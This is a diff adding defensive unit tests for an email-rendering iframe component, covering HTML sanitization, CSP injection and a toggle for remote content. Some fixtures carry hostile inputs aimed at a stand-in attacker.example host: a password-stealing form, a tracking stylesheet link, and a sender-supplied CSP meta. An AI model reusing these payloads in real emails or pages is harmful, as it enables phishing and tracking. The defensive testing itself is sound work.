@@ -2,7 +2,9 @@
 import { cleanup, fireEvent, render, screen } from "@testing-library/react";
 import { afterEach, describe, expect, it } from "vitest";
 import EmailIframe from "./EmailIframe.jsx";
-import { withMobileViewport } from "./withMobileViewport.js";
+import { withEmailContentSecurityPolicy, withMobileViewport } from "./withMobileViewport.js";
+
+const CSP_POLICY = "default-src 'none'; img-src data:; style-src 'unsafe-inline'";
 
 afterEach(() => {
   cleanup();
@@ -44,6 +46,22 @@ describe("EmailIframe sanitization (security surface)", () => {
     const out = srcdocFor('<style>.a{color:red}</style><div class="a" bgcolor="#ffffff">body</div>');
     expect(out).toMatch(/<style/i);
     expect(out).toContain('class="a"');
+    expect(out).toContain("body");
+  });
+
+  it("strips external <link> stylesheets from untrusted email HTML", () => {
+    const out = srcdocFor('<link rel="stylesheet" href="https://attacker.example/track.css"><p>body</p>');
+    expect(out).not.toMatch(/<link/i);
+    expect(out).not.toContain("track.css");
+    expect(out).toContain("body");
+  });
+
+  it("strips inline form controls (phishing surface) from untrusted email HTML", () => {
+    const out = srcdocFor(
+      '<form action="https://attacker.example/steal"><input name="password" type="password"><button>Log in</button></form><p>body</p>',
+    );
+    expect(out).not.toMatch(/<form|<input|<button/i);
+    expect(out).not.toContain("attacker.example");
     expect(out).toContain("body");
   });
 
@@ -160,6 +178,100 @@ describe("EmailIframe mobile viewport", () => {
     render(<EmailIframe html="<p>hi</p>" isMobile />);
     const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
     expect(out).not.toMatch(/maximum-scale/);
+  });
+});
+
+describe("EmailIframe content security policy", () => {
+  it("injects the CSP meta on desktop, ordered before the body content", () => {
+    const out = srcdocFor("<p>hello</p>");
+    expect(out).toContain('http-equiv="Content-Security-Policy"');
+    expect(out).toContain(CSP_POLICY);
+    expect(out.indexOf("Content-Security-Policy")).toBeLessThan(out.indexOf("hello"));
+  });
+
+  it("injects the CSP meta on mobile, ordered before the viewport meta", () => {
+    render(<EmailIframe html="<html><head></head><body><p>hi</p></body></html>" isMobile />);
+    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
+    expect(out).toContain('http-equiv="Content-Security-Policy"');
+    expect(out).toContain("width=device-width");
+    expect(out.indexOf("Content-Security-Policy")).toBeLessThan(out.indexOf("width=device-width"));
+  });
+
+  it("never whitelists a network source (no https:/http: in the policy)", () => {
+    const out = srcdocFor("<p>hello</p>");
+    const cspContentMatch = out.match(/http-equiv="Content-Security-Policy" content="([^"]*)"/);
+    expect(cspContentMatch).not.toBeNull();
+    const policyValue = cspContentMatch[1];
+    expect(policyValue).not.toMatch(/https:/);
+    expect(policyValue).not.toMatch(/http:/);
+  });
+
+  it("neutralizes a sender-supplied CSP meta to exactly one http-equiv occurrence", () => {
+    const out = srcdocFor('<meta http-equiv="Content-Security-Policy" content="img-src https:"><p>x</p>');
+    const occurrences = out.match(/http-equiv=/g) || [];
+    expect(occurrences.length).toBe(1);
+    expect(out).toContain(CSP_POLICY);
+  });
+});
+
+describe("EmailIframe show remote content toggle", () => {
+  it("shows the banner when the sanitized body has a remote <img>", () => {
+    render(<EmailIframe html='<img src="https://cdn.example/banner.png"><p>hi</p>' />);
+    expect(screen.getByText(/images are blocked/i)).toBeTruthy();
+  });
+
+  it("does not show the banner for a plain-text-only body", () => {
+    render(<EmailIframe html="<p>just text, no images</p>" />);
+    expect(screen.queryByText(/images are blocked/i)).toBeNull();
+  });
+
+  it("does not show the banner when all images are inline data: URIs", () => {
+    render(<EmailIframe html='<img src="data:image/png;base64,aaaa"><p>hi</p>' />);
+    expect(screen.queryByText(/images are blocked/i)).toBeNull();
+  });
+
+  it("widens the CSP img-src and hides the banner after clicking Show remote content", () => {
+    render(<EmailIframe html='<img src="https://cdn.example/banner.png"><p>hi</p>' />);
+    fireEvent.click(screen.getByRole("button", { name: /show remote content/i }));
+
+    expect(screen.queryByText(/images are blocked/i)).toBeNull();
+    const out = screen.getByTitle("Email content").getAttribute("srcdoc") || "";
+    const cspContentMatch = out.match(/http-equiv="Content-Security-Policy" content="([^"]*)"/);
+    expect(cspContentMatch).not.toBeNull();
+    expect(cspContentMatch[1]).toContain("img-src data: https:");
+    expect(cspContentMatch[1]).toContain("style-src 'unsafe-inline'");
+    expect(cspContentMatch[1]).not.toContain("style-src https:");
+  });
+
+  it("resets to blocked when a different email (new html) is rendered", () => {
+    const { rerender } = render(<EmailIframe html='<img src="https://cdn.example/banner.png"><p>first</p>' />);
+    fireEvent.click(screen.getByRole("button", { name: /show remote content/i }));
+    expect(screen.queryByText(/images are blocked/i)).toBeNull();
+
+    rerender(<EmailIframe html='<img src="https://cdn.example/other.png"><p>second</p>' />);
+    expect(screen.getByText(/images are blocked/i)).toBeTruthy();
+  });
+});
+
+describe("withEmailContentSecurityPolicy", () => {
+  it("inserts the meta just after an existing <head>", () => {
+    const out = withEmailContentSecurityPolicy("<html><head><title>x</title></head><body>b</body></html>");
+    expect(out).toMatch(/<head><meta http-equiv="Content-Security-Policy"/);
+  });
+
+  it("adds a <head> when the document has <html> but no head", () => {
+    const out = withEmailContentSecurityPolicy("<html><body>b</body></html>");
+    expect(out).toMatch(/<html><head><meta http-equiv="Content-Security-Policy"/);
+  });
+
+  it("prepends a <head> when there is no document wrapper", () => {
+    const out = withEmailContentSecurityPolicy("<p>bare</p>");
+    expect(out.startsWith('<head><meta http-equiv="Content-Security-Policy"')).toBe(true);
+  });
+
+  it("accepts an explicit policy string as a second argument", () => {
+    const out = withEmailContentSecurityPolicy("<p>bare</p>", "default-src 'none'; img-src data: https:; style-src 'unsafe-inline'");
+    expect(out).toContain('content="default-src \'none\'; img-src data: https:; style-src \'unsafe-inline\'"');
   });
 });
 
